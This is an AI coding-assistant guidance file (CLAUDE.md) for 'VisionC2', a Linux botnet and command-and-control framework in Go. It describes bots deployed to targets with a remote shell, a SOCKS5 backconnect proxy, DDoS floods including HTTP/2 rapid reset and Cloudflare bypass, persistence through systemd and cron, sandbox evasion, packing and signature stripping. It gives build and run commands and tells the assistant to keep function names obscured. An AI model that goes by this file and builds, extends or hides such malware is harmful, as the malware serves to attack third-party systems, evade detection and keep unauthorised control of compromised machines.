# CLAUDE.md

This file provides guidance to Claude Code (claude.ai/code) when working with code in this repository.

## Project Overview

VisionC2 is a Linux C2 framework written in Go with two components:
- **Bot agent** (`bot/`) — deployed to targets, connects back via TLS 1.3, supports remote shell, SOCKS5 proxy, and L4/L7 attack methods
- **CNC server** (`cnc/`) — manages bot connections via TLS on port 443, with a Bubble Tea TUI (default) or telnet split mode (`--split`)

Go module name: `Vision` (go 1.24.0+)

## Build Commands

```bash
# Full interactive setup (generates crypto, patches config, builds everything)
python3 setup.py

# Build CNC server only
go build -trimpath -ldflags="-s -w -buildid=" -o server ./cnc

# Build single bot binary (e.g. amd64)
GOOS=linux GOARCH=amd64 go build -trimpath -ldflags="-s -w -buildid=" -o bins/ethd0 ./bot

# Cross-compile all 14 bot architectures (with strip + UPX + signature removal)
cd tools && ./build.sh

# Verify encrypted config blobs are valid
go run tools/crypto.go verify

# Encrypt/decrypt strings for config
go run tools/crypto.go encrypt "string"
go run tools/crypto.go decrypt <hex>

# Build relay server (deploy on separate VPS)
go build -trimpath -ldflags="-s -w -buildid=" -o relay ./relay

# Run relay (must match bot's syncToken / CNC MAGIC_CODE)
./relay -key <magic_code> -cp 9001 -sp 1080

# Run CNC
./server              # TUI mode
./server --split      # Telnet mode (port 420)
```

There is no automated test suite. Testing is manual via deployment.

## Architecture

**Bot lifecycle:** decrypt config → daemonize → singleton lock → sandbox detect → persistence (systemd/cron/rc.local) → DNS resolve C2 → TLS connect → auth (HMAC challenge-response) → command loop with auto-reconnect.

**CNC modes:** TUI (`cnc/ui.go`, ~3400 lines, Bubble Tea) or split/telnet CLI (`cnc/cmd.go`). RBAC with 4 tiers: Basic/Pro/Admin/Owner.

**Bot-CNC protocol:** TLS 1.2+ on port 443. HMAC auth using `magicCode`. Bot sends `REGISTER:version:botID:arch:RAM:CPU:procName:uplink`. Commands/responses are plaintext over TLS. Keepalive: PING/PONG every 60s, stale cleanup after 5min.

**SOCKS5 backconnect proxy:** Bot connects OUT to a relay server (`relay/`) via TLS. Relay has two ports: control (for bots, TLS) and SOCKS5 (for clients, plaintext). When a SOCKS5 client connects to the relay, the relay signals the bot over the control channel, bot opens a new data connection, and runs the SOCKS5 protocol through the relay tunnel. C2 address is never exposed — relay is separate infrastructure. Relay endpoints can be pre-configured at build time via `setup.py` or specified at runtime via `!socks <relay:port>`.

## Critical Conventions

### Obfuscated function naming
All bot functions use APT group or Pokemon names to obscure intent. This is intentional — maintain this pattern:
- **Bot control flow:** `stuxnet()` (daemonize), `winnti()` (sandbox detect), `gamaredon()` (TLS connect), `anonymousSudan()` (session handler), `blackEnergy()` (command dispatch), `dragonfly()` (persistence)
- **Attacks:** `snorlax()` (UDP), `gengar()` (TCP), `dragonite()` (SYN), `alakazam()` (HTTP), `machamp()` (HTTPS), `gyarados()` (CF bypass), `darkrai()`/`giratina()` (HTTP/2 rapid reset)
- **SOCKS5 backconnect:** `muddywater()` (start backconnect), `emotet()` (stop), `cozyBear()` (relay control loop), `fancyBear()` (data channel), `trickbot()` (SOCKS5 handler)
- **Crypto:** `charizard()` (key derivation), `venusaur()` (6-layer C2 decoder), `garuda()` (AES-CTR), `blastoise()` (RC4)

### String encryption (AES-128-CTR)
All sensitive strings are encrypted at compile time. `setup.py` generates encrypted blobs and patches `bot/config.go`. Never edit encrypted config constants manually — always use `setup.py` to regenerate. Key derivation uses `charizard()` with MD5 + 16 XOR bytes from Pokemon-named functions + entropy bytes.

### Three campaign tokens (must match between bot and CNC)
- `magicCode` — 16-char HMAC auth key
- `protocolVersion` — version string for handshake
- `cryptSeed` — 8-char hex for encryption key derivation

### Configuration
- `bot/config.go` — all bot constants and encrypted blobs (patched by `setup.py`)
- `cnc/main.go` — CNC constants (magic code, protocol version, ports)
- `cnc/users.json` — operator credentials

### Concurrency
Mutexes (`sync.RWMutex`) are used throughout for bot connections, attacks, and SOCKS credentials. Attack worker pools default to 2024 goroutines. Always maintain proper locking when modifying shared state.

### Debug mode
`verboseLog` in `bot/config.go` — when `debugMode = true`, persistence functions only log without writing. Sandbox detection (`winnti()`) sleeps 24-27 hours, so disable for lab testing.

### Bot ID
Deterministic: `MD5(hostname + ":" + MAC)[:8]`. Same machine always gets the same ID. CNC deduplicates by closing old connections on re-registration.

## Key Dependencies

- `github.com/charmbracelet/bubbletea` — TUI framework (CNC)
- `github.com/google/gopacket` — raw packet crafting (L4 attacks)
- `github.com/miekg/dns` — DNS protocol (C2 resolution, DNS attacks)
- External: `upx` (binary compression), `python3` (setup wizard), `openssl` (cert generation)
